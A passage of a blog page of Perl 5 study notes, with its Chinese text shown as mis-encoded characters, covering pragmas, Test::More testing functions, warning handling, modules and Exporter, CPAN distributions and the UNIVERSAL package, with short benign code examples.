¸å¿ƒç¼–è¯‘å‘½ä»¤</h3><ul><li>strict</li><li>warnings</li><li>utf8</li><li>autodie</li><li>constant, å¯ç”¨ CPAN çš„ <code>Readonly</code> æ›¿ä»£</li><li>vars</li><li>autobox</li><li>perl5i</li></ul><p>Perl 5.10.0 æ–°å¢äº†ç”¨çº¯ Perl ä»£ç ç¼–å†™ä½ è‡ªå·±çš„è¯æ³•ç¼–è¯‘å‘½ä»¤çš„èƒ½åŠ›, å‚è€ƒ <code>perldoc perlvar</code>, <code>perldoc perlvar</code> å¯¹ <code>$^H</code> çš„è§£é‡Šè¯´æ˜æ­¤ç‰¹æ€§çš„å·¥ä½œåŸç†.</p><h1 id="ç®¡ç†ç°å®ä¸–ç•Œä¸­çš„ç¨‹åº"><a href="#ç®¡ç†ç°å®ä¸–ç•Œä¸­çš„ç¨‹åº" class="headerlink" title="ç®¡ç†ç°å®ä¸–ç•Œä¸­çš„ç¨‹åº"></a>ç®¡ç†ç°å®ä¸–ç•Œä¸­çš„ç¨‹åº</h1><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><h3 id="Test-More"><a href="#Test-More" class="headerlink" title="Test::More"></a>Test::More</h3><p>Perl æµ‹è¯•å§‹äºæ ¸å¿ƒæ¨¡å— <code>Test::More</code> åŠå…¶ <code>ok()</code> å‡½æ•°, <code>ok()</code> æ¥å—ä¸¤ä¸ªå‚æ•°, ä¸€ä¸ªå¸ƒå°”å€¼å’Œä¸€ä¸ªæè¿°æµ‹è¯•ç›®çš„çš„å­—ç¬¦ä¸²:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">ok( <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;the number one should be true&#x27;</span> );<br></code></pre></td></tr></table></figure><p><code>Test::More</code> çš„ <code>tests</code> å‚æ•°ä¸ºç¨‹åºè®¾ç½®æµ‹è¯•è®¡åˆ’, å¦‚æœå®é™…æ‰§è¡Œçš„æµ‹è¯•ä¸ç­‰äºæŸé¡¹, è¡¨ç¤ºæœ‰é”™è¯¯å‘ç”Ÿ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Test::More <span class="hljs-string">tests =&gt;</span> <span class="hljs-number">4</span>;<br><br>ok( ... );<br>ok( ... );<br>ok( ... );<br>ok( ... );<br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨æµ‹è¯•ç¨‹åºçš„ç»“å°¾, è°ƒç”¨ <code>donw_testing()</code> å‡½æ•°, å…¶ä¼šéªŒè¯æˆåŠŸæ‰§è¡Œçš„æµ‹è¯•æ•°é‡.</p><h4 id="æ‰§è¡Œæµ‹è¯•"><a href="#æ‰§è¡Œæµ‹è¯•" class="headerlink" title="æ‰§è¡Œæµ‹è¯•"></a>æ‰§è¡Œæµ‹è¯•</h4><p>TAP (Test Anythinig Protocol) æ ¼å¼.</p><p>æ ¸å¿ƒæ¨¡å— <code>Test::Harness</code> è§£æ TAP å¹¶æ˜¾ç¤ºæœ€è´´åˆ‡çš„ä¿¡æ¯, å…¶åŒæ—¶æä¾›äº†ä¸€ä¸ªåä¸º <code>prove</code> çš„ç¨‹åº.</p><h4 id="æ›´å¥½çš„æ¯”è¾ƒ"><a href="#æ›´å¥½çš„æ¯”è¾ƒ" class="headerlink" title="æ›´å¥½çš„æ¯”è¾ƒ"></a>æ›´å¥½çš„æ¯”è¾ƒ</h4><p><code>Test::More</code> çš„ <code>is()</code> å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªå€¼, å¦‚æœä»–ä»¬åŒ¹é…, åˆ™æµ‹è¯•é€šè¿‡, å¦åˆ™, æµ‹è¯•å¤±è´¥å¹¶æä¾›ç›¸å…³è¯Šæ–­ä¿¡æ¯:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">is(  <span class="hljs-number">4</span>, <span class="hljs-number">2</span> + <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;addition should hold steady across the universe&#x27;</span>);<br></code></pre></td></tr></table></figure><p><code>is()</code> å¯¹å…¶å€¼éšå¼åº”ç”¨æ ‡é‡ä¸Šä¸‹æ–‡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">is( @cousins, <span class="hljs-number">6</span>, <span class="hljs-string">&#x27;I should have only six cousins&#x27;</span> );<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>@cousins</code> è¡¨ç¤ºæ•°ç»„é•¿åº¦. (ä¹Ÿå¯å†™æˆ <code>scalar @cousins</code>)</p><p><code>Test::More</code> è¿˜æä¾›äº†ä¸ <code>is()</code> ç›¸å¯¹åº”çš„ <code>isnt()</code> å‡½æ•°.</p><p><code>is()</code> å’Œ <code>isnt()</code> éƒ½æ˜¯é€šè¿‡ Perl 5 æ“ä½œç¬¦ <code>eq</code> åŠ <code>ne</code> è¿›è¡Œå­—ç¬¦ä¸²æ¯”è¾ƒ, å¯¹äºå¤æ‚çš„å€¼æ—¶, å¯ä½¿ç”¨ <code>cmp_ok()</code> å‡½æ•°, å…¶å…è®¸æŒ‡å®šè‡ªå·±çš„æ¯”è¾ƒæ“ä½œç¬¦:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">cmp_ok( <span class="hljs-number">100</span>, $cur_balance, <span class="hljs-string">&#x27;&lt;=&#x27;</span>, <span class="hljs-string">&#x27;I should have at least $100&#x27;</span> );<br></code></pre></td></tr></table></figure><p>é€šè¿‡ <code>isa_ok()</code> å¯ä»¥æµ‹è¯•ä¸€ä¸ªç±»æˆ–å¯¹è±¡æ˜¯å¦æ˜¯å…¶ä»–å¯¹è±¡çš„æ‰©å±•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $chimpzilla = RobotMonkey-&gt;new();<br>isa_ok( $chimpzilla, <span class="hljs-string">&#x27;Robot&#x27;</span> );<br>isa_ok( $chimpzilla, <span class="hljs-string">&#x27;Monkey&#x27;</span> );<br></code></pre></td></tr></table></figure><p><code>isa_ok()</code> åœ¨å¤±è´¥æ—¶ä¼šæä¾›è‡ªå·±çš„è¯Šæ–­ä¿¡æ¯.</p><p><code>can_ok()</code> éªŒè¯ä¸€ä¸ªç±»æˆ–å¯¹è±¡æ˜¯å¦èƒ½æ‰§è¡Œæ‰€è¦æ±‚çš„ (å¤šä¸ª) æ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">can_ok( $chimpzilla, <span class="hljs-string">&#x27;eat_banana&#x27;</span> );<br></code></pre></td></tr></table></figure><p><code>is_deeply()</code> å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªå¼•ç”¨ä»¥ä¿è¯ä»–ä»¬çš„å†…å®¹ç›¸åŒ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Clone:<br><br><span class="hljs-keyword">my</span> $numbers = [ <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>, <span class="hljs-number">42</span> ];<br><span class="hljs-keyword">my</span> $clonenums = Clone::clone( $numbers );<br><br>is_deeply( $numbers, $clonenums,<br>        <span class="hljs-string">&#x27;Clone::clone() should produce identical structures&#x27;</span> );<br></code></pre></td></tr></table></figure><p>å‚è§ <code>Test::Differences</code> å’Œ <code>Test::Deep</code> äº†è§£æ›´å¤šæœ‰å…³å¯é…ç½®æµ‹è¯•çš„ä¿¡æ¯.</p><h4 id="ç»„ç»‡æµ‹è¯•"><a href="#ç»„ç»‡æµ‹è¯•" class="headerlink" title="ç»„ç»‡æµ‹è¯•"></a>ç»„ç»‡æµ‹è¯•</h4><p>CPAN ç»„ç»‡æµ‹è¯•çš„æ ‡å‡†æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªä»¥ <code>.t</code> ç»“å°¾ç¨‹åºçš„ <code>t/</code> ç›®å½•.</p><p>æ‰€æœ‰çš„ CPAN å‘è¡Œæ¨¡å—ç®¡ç†å·¥å…·éƒ½èƒ½ç†è§£è¿™å¥—ç³»ç»Ÿ.</p><p>é»˜è®¤çš„, å½“ä½ ä½¿ç”¨ <code>Module::Build</code> æˆ– <code>ExtUtils::MakeMaker</code> æ„å»ºä¸€ä¸ªå‘è¡Œæ¨¡å—æ—¶, æµ‹è¯•æ­¥éª¤å°†æ‰§è¡Œæ‰€æœ‰ <code>t/*.t</code> æ–‡ä»¶, ç»¼åˆå®ƒä»¬çš„è¾“å‡º, å¹¶æŒ‰æµ‹è¯•å¥—ä»¶çš„æ€»ä½“ç»“æœå†³å®šæµ‹è¯•é€šè¿‡è¿˜æ˜¯ä¸é€šè¿‡.</p><p>ä¸¤ç§ç®¡ç† <code>.t</code> æ–‡ä»¶çš„ç­–ç•¥:</p><ul><li>æ¯ä¸ª <code>.t</code> æ–‡ä»¶å¯¹åº”ä¸€ä¸ª <code>.pm</code> æ–‡ä»¶</li><li>æ¯ä¸ª <code>.t</code> æ–‡ä»¶å¯¹åº”ä¸€ä¸ªç¨‹åºåŠŸèƒ½</li></ul><p>ä¸€ç§æ··åˆçš„ç®¡ç†æ–¹å¼è¾ƒä¸ºçµæ´»: ç”±ä¸€ä¸ªæµ‹è¯•éªŒè¯æ‰€æœ‰æ¨¡å—æ˜¯å¦èƒ½å¤Ÿç¼–è¯‘, å…¶ä»–æµ‹è¯•ç¡®ä¿æ¯ä¸ªæ¨¡å—éƒ½èƒ½å¦‚å¸¸å·¥ä½œ.</p><h4 id="å…¶ä»–æµ‹è¯•æ¨¡å—"><a href="#å…¶ä»–æµ‹è¯•æ¨¡å—" class="headerlink" title="å…¶ä»–æµ‹è¯•æ¨¡å—"></a>å…¶ä»–æµ‹è¯•æ¨¡å—</h4><p><code>Test::More</code> ä¾èµ–åä¸º <code>Test::Builder</code> çš„æµ‹è¯•åç«¯, åè€…ç®¡ç†æµ‹è¯•è®¡åˆ’å¹¶å°†æµ‹è¯•ç»“æœç»„ç»‡ä¸º TAP.</p><p><img src="/../img/Perl_Test_Modules.png"></p><h2 id="å¤„ç†è­¦å‘Š"><a href="#å¤„ç†è­¦å‘Š" class="headerlink" title="å¤„ç†è­¦å‘Š"></a>å¤„ç†è­¦å‘Š</h2><h3 id="äº§ç”Ÿè­¦å‘Š"><a href="#äº§ç”Ÿè­¦å‘Š" class="headerlink" title="äº§ç”Ÿè­¦å‘Š"></a>äº§ç”Ÿè­¦å‘Š</h3><p><code>warn</code> å°†ä¸€ä¸ªå€¼åˆ—è¡¨æ‰“å°è‡³ STDERR æ–‡ä»¶å¥æŸ„, Perl ä¼šå°†æ–‡ä»¶åå’Œ <code>warn</code> è°ƒç”¨å‘ç”Ÿçš„è¡Œåé™„åŠ å…¶å.</p><p>å¯ä½¿ç”¨æ ¸å¿ƒæ¨¡å— <code>Carp</code>, å…¶ <code>cluck()</code> è¾“å‡ºåˆ°æ­¤è°ƒç”¨ä¸ºæ­¢çš„æ‰€æœ‰å‡½æ•°è°ƒç”¨æ ˆè·Ÿè¸ª.</p><p>å¯ä»¥å¯¹æŸä¸ªç¨‹åºå¯ç”¨ <code>Carp</code> çš„è¯¦ç»†æ¨¡å¼:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -MCarp=verbose my_prog.pl<br></code></pre></td></tr></table></figure><h3 id="å¯ç”¨å’Œç¦ç”¨è­¦å‘Š"><a href="#å¯ç”¨å’Œç¦ç”¨è­¦å‘Š" class="headerlink" title="å¯ç”¨å’Œç¦ç”¨è­¦å‘Š"></a>å¯ç”¨å’Œç¦ç”¨è­¦å‘Š</h3><p>ä½¿ç”¨ <code>warnings</code> ç¼–è¯‘å‘½ä»¤å³å¯.</p><h3 id="ç¦ç”¨è­¦å‘Šç±»"><a href="#ç¦ç”¨è­¦å‘Šç±»" class="headerlink" title="ç¦ç”¨è­¦å‘Šç±»"></a>ç¦ç”¨è­¦å‘Šç±»</h3><p>ä½¿ç”¨ <code>no warnings;</code> å³å¯.</p><p><code>perldoc perllexwarn</code> åˆ—å‡ºäº†ä½ çš„ Perl 5 ç‰ˆæœ¬åœ¨ä½¿ç”¨ <code>warnings</code> ç¼–è¯‘å‘½ä»¤æ—¶èƒ½å¤Ÿç†è§£çš„æ‰€æœ‰ç±»åˆ«çš„è­¦å‘Š.</p><p>å¦‚: <code>recursion</code>, <code>redefine</code>, <code>uninitialized</code>.</p><h3 id="è‡´å‘½çš„è­¦å‘Š"><a href="#è‡´å‘½çš„è­¦å‘Š" class="headerlink" title="è‡´å‘½çš„è­¦å‘Š"></a>è‡´å‘½çš„è­¦å‘Š</h3><p>è®©æ‰€æœ‰è­¦å‘Šæå‡ä¸ºå¼‚å¸¸:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> warnings <span class="hljs-string">FATAL =&gt;</span> <span class="hljs-string">&#x27;all&#x27;</span>;<br></code></pre></td></tr></table></figure><p>ä½¿ç‰¹å®šè­¦å‘Šå˜å¾—è‡´å‘½:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> warnings <span class="hljs-string">FATAL =&gt;</span> <span class="hljs-string">&#x27;deprecated&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="æ•è·è­¦å‘Š"><a href="#æ•è·è­¦å‘Š" class="headerlink" title="æ•è·è­¦å‘Š"></a>æ•è·è­¦å‘Š</h2><p><code>%SIG</code> å˜é‡æŒæœ‰æ‰€æœ‰ç±»å‹çš„ä¿¡å·å¤„ç†å™¨. è¿™äº›ä¿¡å·å¯ç”± Perl æˆ–ä½ çš„æ“ä½œç³»ç»ŸæŠ›å‡º. å®ƒè¿˜åŒ…æ‹¬ä¸¤ä¸ªä¸“ä¸º Perl 5 å¼‚å¸¸å’Œè­¦å‘Šå‡†å¤‡çš„ä¿¡å·å¤„ç†å™¨æ§½, è¦æ•è·è­¦å‘Š, å°†ä¸€ä¸ªåŒ¿åå‡½æ•°å®‰è£…åˆ° <code>$SIG&#123;__WARN__&#125;</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-keyword">my</span> $warning;<br>    <span class="hljs-keyword">local</span> $SIG<span class="hljs-string">&#123;__WARN__&#125;</span> = <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; $warning .= <span class="hljs-keyword">shift</span> &#125;;<br><br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;Caught warning:\n$warning&quot;</span> <span class="hljs-keyword">if</span> $warning;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„æ„æ€å¤§æ¦‚æ˜¯, å½“ <code>warn</code> æŠ›å‡ºè­¦å‘Šæ—¶, å°±ä¼šè§¦å‘ <code>$SIG&#123;__WARN__&#125;</code> ä¸‹çš„åŒ¿åå‡½æ•°æ¥å¤„ç†, å³å°†è­¦å‘Šä¿¡æ¯ä½œä¸ºä¸€ä¸ªå‚æ•°ä¼ å…¥è¿™ä¸ªå‡½æ•°.</p><p><code>perldoc perlvar</code> æ›´ä¸ºè¯¦ç»†åœ°è®¨è®ºäº† <code>%SIG</code>.</p><h3 id="æ³¨å†Œè‡ªå·±çš„è­¦å‘Š"><a href="#æ³¨å†Œè‡ªå·±çš„è­¦å‘Š" class="headerlink" title="æ³¨å†Œè‡ªå·±çš„è­¦å‘Š"></a>æ³¨å†Œè‡ªå·±çš„è­¦å‘Š</h3><p>å¯¹ <code>warnings::register</code> ç¼–è¯‘å‘½ä»¤çš„ä½¿ç”¨å¯ä»¥è®©ä½ åˆ›å»ºè‡ªå·±çš„è¯æ³•è­¦å‘Š. å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Scalar::Monkey;<br><br><span class="hljs-keyword">use</span> warnings::register;<br><br><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç , åˆ›å»ºäº†ä¸€ä¸ªä»¥æ­¤åŒ…å‘½åçš„æ–°è­¦å‘Šç±»åˆ« (å³ <code>Scalar::Monkey</code>). å¯ä»¥é€šè¿‡ <code>use warnings &#39;Scalar::Monkey</code> æ¥å¯ç”¨. æˆ–ç”¨ <code>no warnings &#39;Scalar::Monkey</code> æ¥ç¦ç”¨.</p><p>è¦æŠ¥å‘Šä¸€æ¡è­¦å‘Š, éœ€è¦ä½¿ç”¨ <code>warnings::enabled()</code>  å’Œ <code>warnings::warn()</code> å‡½æ•°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Scalar::Monkey;<br><br><span class="hljs-keyword">use</span> warnings::register;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">import</span> </span>&#123;<br>    warnings::<span class="hljs-keyword">warn</span>( __PACKAGE_<span class="hljs-number">_</span> . <span class="hljs-string">&#x27; used with empty import list&#x27;</span> )<br>        <span class="hljs-keyword">if</span> @_ == <span class="hljs-number">0</span> &amp;&amp; warnings::enabled();<br>&#125;<br><br><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p><code>warnings::enabled()</code> ä¸ºçœŸæ‰ä¼šåœ¨è°ƒç”¨æ–¹çš„è¯æ³•ä½œç”¨åŸŸå¯ç”¨æ­¤é¡¹è­¦å‘Šã€‚è¿™é‡Œçš„å«ä¹‰æ˜¯, <code>import</code> æ˜¯é»˜è®¤è°ƒç”¨çš„å‡½æ•°, å¦‚æœæ²¡æœ‰å‘ <code>import</code> ä¼ å…¥ä»»ä½•å‚æ•°æˆ– <code>warnings::enabled()</code> çš„å€¼ä¸ºå‡, å°±å‘å‡ºè­¦å‘Š. è¿™é‡Œçš„ <code>__PACKAGE__</code> æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡.</p><p>å…·ä½“è§ <code>perldoc perllexwarn</code></p><h2 id="æ¨¡å—"><a href="#æ¨¡å—" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h2><p>ä¸€ä¸ªæ¨¡å—å¿…é¡»æ˜¯åˆæ³•çš„ Perl 5 ä»£ç , å®ƒå¿…é¡»ä»¥ä¸€ä¸ªæ±‚å€¼å¾—çœŸçš„è¡¨è¾¾å¼ç»“æŸ, ä½¿ Perl 5 è¯­æ³•åˆ†æå™¨çŸ¥é“å®ƒå·²æˆåŠŸåœ°åŠ è½½å¹¶ç¼–è¯‘äº†è¯¥æ¨¡å—.</p><p>åŒ…é€šå¸¸æ˜¯ç£ç›˜ä¸Šçš„æ–‡ä»¶, å½“ä½ ä½¿ç”¨ <code>use</code> æˆ– <code>require</code> çš„è£¸å­—å½¢å¼åŠ è½½ä¸€ä¸ªæ¨¡å—æ—¶, perl æ ¹æ® <code>::</code> åˆ†å‰²åŒ…å, å¹¶å°†åŒ…åçš„ç»„æˆéƒ¨åˆ†è½¬æ¢æˆè·¯å¾„, å› æ­¤:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> StrangeMonkey;<br></code></pre></td></tr></table></figure><p>ä½¿å¾— Perl åœ¨ <code>@INC</code> çš„æ¯ä¸€ä¸ªç›®å½•ä¸­ä¸€æ¬¡æœç´¢åä¸º <code>StrangeMonkey.pm</code> çš„æ–‡ä»¶. </p><p>perldoc -l Module::Name ä¼šæ‰“å°ç›¸å…³ <code>.pm</code> æ–‡ä»¶çš„å®Œæ•´è·¯å¾„, å¹¶æä¾›å­˜åœ¨äº <code>.pm</code> æ–‡ä»¶ä¸­è¯¥æ¨¡å—çš„æ–‡æ¡£.</p><p>æŠ€æœ¯ä¸Šä¸è¦æ±‚æ­¤ä½ç½®ä¸‹çš„æ–‡ä»¶å¿…é¡»åŒ…å« <code>package</code> å£°æ˜, ä½†é«˜åº¦æ¨èæ­¤æƒ¯ä¾‹.</p><h3 id="ä½¿ç”¨-use-å’Œ-å¯¼å…¥-import"><a href="#ä½¿ç”¨-use-å’Œ-å¯¼å…¥-import" class="headerlink" title="ä½¿ç”¨ use å’Œ å¯¼å…¥ import"></a>ä½¿ç”¨ <code>use</code> å’Œ å¯¼å…¥ <code>import</code></h3><p>å½“ç”¨ <code>use</code> å…³é”®å­—åŠ è½½æ¨¡å—æ—¶, Perl ä»ç£ç›˜ä¸ŠåŠ è½½å®ƒ, æ¥ç€è°ƒç”¨ <code>import()</code> æ–¹æ³•, å°†ä½ æä¾›çš„å‚æ•°ä¼ é€’è¿›å», è¿™å‘ç”Ÿåœ¨ç¼–è¯‘æœŸ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> strict;     <span class="hljs-comment"># è°ƒç”¨ strict-&gt;import</span><br></code></pre></td></tr></table></figure><p><code>no</code> å…³é”®å­—è°ƒç”¨ä¸€ä¸ªæ¨¡å—çš„ <code>unimport()</code> æ–¹æ³•. å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">no</span> Module::Name <span class="hljs-string">qw( list of arguments )</span>;<br></code></pre></td></tr></table></figure><p>å’Œ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">BEGIN &#123;<br>    <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;Module/Name.pm&#x27;</span>;<br>    Module::Name-&gt;unimport( <span class="hljs-string">qw( list of arguments )</span> );<br>&#125;<br></code></pre></td></tr></table></figure><p>Perl 5 çš„ <code>use</code> å’Œ <code>require</code> æ˜¯å¤§å°å†™æ•æ„Ÿçš„.</p><h3 id="å¯¼å‡º-export"><a href="#å¯¼å‡º-export" class="headerlink" title="å¯¼å‡º export"></a>å¯¼å‡º <code>export</code></h3><p>æ¨¡å—å¯ä»¥é€šè¿‡ä¸€ä¸ªåä¸º <mark>å¯¼å‡º</mark> çš„è¿‡ç¨‹ä½¿å…¨å±€ç¬¦å·åœ¨å…¶ä»–åŒ…ä¸­å¯ç”¨.</p><p>å‘å…¶ä»–æ¨¡å—åˆ°å¤„å‡½æ•°æˆ–å˜é‡çš„æ ‡å‡†æ–¹å¼æ˜¯é€šè¿‡æ ¸å¿ƒæ¨¡å— <code>Exporter</code>. <code>Exporter</code> ä¾èµ–äºåŒ…å…¨å±€å˜é‡, ç‰¹åˆ«æ˜¯ <code>@EXPORT_OK</code> å’Œ <code>@EXPORT</code>, å…¶åŒ…å«äº†ä¸€ä¸ªåœ¨è¯·æ±‚æ—¶å¯¼å‡ºçš„ç¬¦å·åˆ—è¡¨.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> StrangeMonkey::Utilities;<br><br><span class="hljs-keyword">use</span> Exporter <span class="hljs-string">&#x27;import&#x27;</span>;<br><br><span class="hljs-keyword">our</span> @EXPORT_OK = <span class="hljs-string">qw( round_number translate screech )</span>;<br><br>...<br><br><span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>CPAN æ¨¡å— <code>Sub::Exporter</code> ä¸ºä¸ä½¿ç”¨åŒ…å…¨å±€å˜é‡å¯¼å‡ºå‡½æ•°æä¾›äº†ä¸€ä¸ªæ›´å¥½çš„æ¥å£. ä½†æœŸåªèƒ½å¯¼å‡ºå‡½æ•°.</p><p>å¯ä»¥é€šè¿‡å°†ç¬¦å·åˆ—åœ¨ <code>@EXPORT</code> ä¸­æ¥é»˜è®¤å¯¼å‡º.</p><p>å½“ä½ æŒ‡å®šè¦å¯¼å…¥çš„ç¬¦å·åˆ—è¡¨æ—¶å°±ä¸ä¼šé»˜è®¤å¯¼å‡º, å³, å¦‚æœå¯¼å…¥ä¸€ä¸ªç©ºåˆ—è¡¨, å°±ä¸ä¼šå¯¼å…¥ä»»ä½•ç¬¦å·:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> StrangeMonkey::Utilities ();<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨æ¨¡å—æ¥ç»„ç»‡ä»£ç "><a href="#ä½¿ç”¨æ¨¡å—æ¥ç»„ç»‡ä»£ç " class="headerlink" title="ä½¿ç”¨æ¨¡å—æ¥ç»„ç»‡ä»£ç "></a>ä½¿ç”¨æ¨¡å—æ¥ç»„ç»‡ä»£ç </h3><p>Perl 5 å¹¶ä¸è¦æ±‚ä½ ä½¿ç”¨æ¨¡å—, ä¹Ÿä¸è¦æ±‚ä½¿ç”¨åŒ…æˆ–æ˜¯åç§°ç©ºé—´, å¯ä»¥å°†æ‰€æœ‰ä»£ç æ”¾åœ¨å•ä¸ª <code>.pl</code> æ–‡ä»¶ä¸­, æˆ–å¤šä¸ª <code>.pl</code> æ–‡ä»¶, éšåå¯ä»¥æŒ‰éœ€é€šè¿‡ <code>do</code> æˆ– <code>require</code> åŠ è½½.</p><h3 id="å‘è¡Œæ¨¡å—"><a href="#å‘è¡Œæ¨¡å—" class="headerlink" title="å‘è¡Œæ¨¡å—"></a>å‘è¡Œæ¨¡å—</h3><p>å‘è¡Œæ¨¡å— (distribution) æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªæ¨¡å—çš„é›†åˆ.</p><h3 id="å‘è¡Œæ¨¡å—çš„å±æ€§"><a href="#å‘è¡Œæ¨¡å—çš„å±æ€§" class="headerlink" title="å‘è¡Œæ¨¡å—çš„å±æ€§"></a>å‘è¡Œæ¨¡å—çš„å±æ€§</h3><p>åŒ…æ‹¬çš„æ–‡ä»¶å’Œç›®å½•å¦‚:</p><p><img src="/../img/Perl_Module_Distribution_Contents.png"></p><p>é¢å¤–åœ°, ä¸€ä¸ªç»„ç»‡è‰¯å¥½çš„å‘è¡Œæ¨¡å—å¿…é¡»åŒ…å«å”¯ä¸€çš„åç§°å’Œå•ä¸ªç‰ˆæœ¬å·.</p><h3 id="CPAN-å‘è¡Œæ¨¡å—ç®¡ç†å·¥å…·"><a href="#CPAN-å‘è¡Œæ¨¡å—ç®¡ç†å·¥å…·" class="headerlink" title="CPAN å‘è¡Œæ¨¡å—ç®¡ç†å·¥å…·"></a>CPAN å‘è¡Œæ¨¡å—ç®¡ç†å·¥å…·</h3><p><img src="/../img/Some_Utils_of_Perl_1.png"></p><p><img src="/../img/Some_Utils_of_Perl_2.png"></p><h3 id="è®¾è®¡å‘è¡Œæ¨¡å—"><a href="#è®¾è®¡å‘è¡Œæ¨¡å—" class="headerlink" title="è®¾è®¡å‘è¡Œæ¨¡å—"></a>è®¾è®¡å‘è¡Œæ¨¡å—</h3><p>å¯å‚è§ Sam Tregar çš„ä¸€æœ¬ä¹¦ <code>Writing Perl Modules for CPAN</code>.</p><p>å¯ä» <code>Module::Starter</code> æˆ– <code>Dist::Zilla</code> æ¨¡å—å¼€å§‹.</p><p>CPAN::Mini å‘è¡Œæ¨¡å—å…è®¸ä½ åˆ›å»ºä½ è‡ªå·±çš„æœ¬åœ° CPAN é•œåƒ.</p><h2 id="UNIVERSAL-åŒ…"><a href="#UNIVERSAL-åŒ…" class="headerlink" title="UNIVERSAL åŒ…"></a>UNIVERSAL åŒ…</h2><p>å°±é¢å‘å¯¹è±¡æ¥è¯´, å®ƒæ˜¯æ‰€æœ‰åŒ…çš„å…ˆç¥–. <code>UNIVERSAL</code> åŒ…ä¸ºå…¶å®ƒç±»å’Œå¯¹è±¡æä¾›äº†è‹¥å¹²å¯ç”¨çš„æ–¹æ³•.</p><h3 id="isa-æ–¹æ³•"><a href="#isa-æ–¹æ³•" class="headerlink" title="isa() 